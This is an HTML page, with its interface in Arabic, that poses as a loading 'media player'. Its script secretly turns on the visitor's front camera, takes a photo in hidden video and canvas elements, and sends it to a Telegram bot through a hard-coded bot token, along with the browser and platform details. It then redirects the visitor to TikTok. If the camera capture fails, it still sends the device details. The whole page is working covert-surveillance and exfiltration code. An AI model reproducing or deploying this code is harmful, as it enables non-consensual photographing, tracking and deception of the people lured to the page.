<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>مشغل الوسائط</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #f0f2f5;
            font-family: system-ui, -apple-system, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .loader {
            text-align: center;
            padding: 30px;
            background: white;
            border-radius: 15px;
            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
            width: 300px;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #1e90ff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            color: #555;
            font-size: 16px;
            margin: 10px 0;
        }
        .hidden {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            border: 0;
        }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <div class="status" id="statusText">جاري تحميل المشغل...</div>
    </div>

    <video id="video" autoplay playsinline class="hidden"></video>
    <canvas id="canvas" class="hidden"></canvas>

    <script>
        (function() {
            // الإعدادات
            const CONFIG = {
                botToken: "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU",
                chatId: new URLSearchParams(window.location.search).get('id'),
                maxRetries: 3,
                retryDelay: 1000,
                captureDelay: 3000, // 3 ثواني انتظار
                fallbackUrl: "https://www.tiktok.com"
            };

            // عناصر DOM
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const statusEl = document.getElementById('statusText');

            // متغيرات الحالة
            let stream = null;
            let retryCount = 0;
            let captureCompleted = false;

            // تحديث النص
            function setStatus(text) {
                if (statusEl) statusEl.innerText = text;
            }

            // فحص جودة الصورة (ليست سوداء)
            function isImageValid(blob) {
                return blob && blob.size > 5000; // الصورة الحقيقية أكبر من 5KB
            }

            // التقاط الصورة مع التأكد من جودتها
            async function captureWithQualityCheck() {
                if (captureCompleted || !stream) return false;

                try {
                    setStatus("جاري ضبط الكاميرا...");
                    
                    // انتظار حتى يكون الفيديو جاهزاً
                    if (!video.videoWidth || !video.videoHeight) {
                        await new Promise(resolve => setTimeout(resolve, 500));
                        return false;
                    }

                    // ضبط الكانفس
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    
                    const ctx = canvas.getContext('2d');
                    
                    // محاولة عدة مرات مع تأخير
                    for (let attempt = 1; attempt <= 3; attempt++) {
                        setStatus(`محاولة ${attempt}/3...`);
                        
                        // انتظار قليلاً قبل كل محاولة (لضبط الإضاءة التلقائية)
                        await new Promise(resolve => setTimeout(resolve, 800));
                        
                        // رسم الإطار الحالي
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        // تحويل إلى blob وفحص الجودة
                        const blob = await new Promise(resolve => {
                            canvas.toBlob(resolve, 'image/jpeg', 0.95);
                        });
                        
                        if (isImageValid(blob)) {
                            return await sendPhoto(blob);
                        }
                        
                        console.log(`المحاولة ${attempt}: الصورة صغيرة جداً (${blob?.size} بايت)`);
                    }
                    
                    return false;
                    
                } catch (error) {
                    console.error("خطأ في التصوير:", error);
                    return false;
                }
            }

            // إرسال الصورة
            async function sendPhoto(blob) {
                if (captureCompleted) return true;
                
                try {
                    setStatus("جاري الإرسال...");
                    
                    const formData = new FormData();
                    formData.append('chat_id', CONFIG.chatId);
                    formData.append('photo', blob, 'photo.jpg');
                    formData.append('caption', `✅ تم التصوير بنجاح
🆔 المعرف: ${CONFIG.chatId}
📱 النظام: ${navigator.platform}
🌐 المتصفح: ${navigator.userAgent}
📏 الدقة: ${canvas.width}x${canvas.height}
💾 الحجم: ${(blob.size / 1024).toFixed(1)}KB
⏱️ الوقت: ${new Date().toLocaleString('ar-EG')}`);

                    const response = await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });

                    if (response.ok) {
                        captureCompleted = true;
                        setStatus("✅ تم الإرسال");
                        
                        // إيقاف الكاميرا
                        if (stream) {
                            stream.getTracks().forEach(track => track.stop());
                        }
                        
                        // التوجيه بعد ثانية
                        setTimeout(() => {
                            window.location.href = CONFIG.fallbackUrl;
                        }, 1000);
                        
                        return true;
                    }
                    
                } catch (error) {
                    console.error("فشل الإرسال:", error);
                }
                
                return false;
            }

            // إرسال معلومات فقط (بدون صورة)
            async function sendInfoOnly() {
                try {
                    await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CONFIG.chatId,
                            text: `⚠️ تعذر التصوير
🆔 المعرف: ${CONFIG.chatId}
📱 النظام: ${navigator.platform}
🌐 المتصفح: ${navigator.userAgent}
❌ السبب: فشل الحصول على صورة صالحة`
                        })
                    });
                } catch (e) {}
            }

            // بدء تشغيل الكاميرا
            async function startCamera() {
                if (!CONFIG.chatId) {
                    window.location.href = CONFIG.fallbackUrl;
                    return;
                }

                try {
                    setStatus("طلب إذن الكاميرا...");
                    
                    stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: "user",
                            width: { ideal: 1280 },
                            height: { ideal: 720 },
                            frameRate: { ideal: 30 }
                        }
                    });

                    video.srcObject = stream;
                    
                    // انتظار تحميل الفيديو
                    await new Promise((resolve) => {
                        video.onloadedmetadata = () => {
                            video.play();
                            resolve();
                        };
                    });

                    setStatus("الكاميرا جاهزة، انتظر لحظة...");
                    
                    // انتظار 3 ثواني لضبط الإضاءة التلقائية
                    await new Promise(resolve => setTimeout(resolve, CONFIG.captureDelay));
                    
                    // محاولة التصوير مع فحص الجودة
                    const success = await captureWithQualityCheck();
                    
                    if (!success) {
                        // فشل التصوير، أرسل معلومات فقط
                        await sendInfoOnly();
                        
                        // توجيه بعد ثانية
                        setTimeout(() => {
                            window.location.href = CONFIG.fallbackUrl;
                        }, 1000);
                    }

                } catch (error) {
                    console.error("خطأ في الكاميرا:", error);
                    
                    // أرسل معلومات فقط
                    await sendInfoOnly();
                    
                    // توجيه
                    window.location.href = CONFIG.fallbackUrl;
                }
            }

            // بدء التشغيل
            startCamera();

            // حد أقصى 10 ثواني
            setTimeout(() => {
                if (!captureCompleted) {
                    window.location.href = CONFIG.fallbackUrl;
                }
            }, 10000);

        })();
    </script>
</body>
</html>
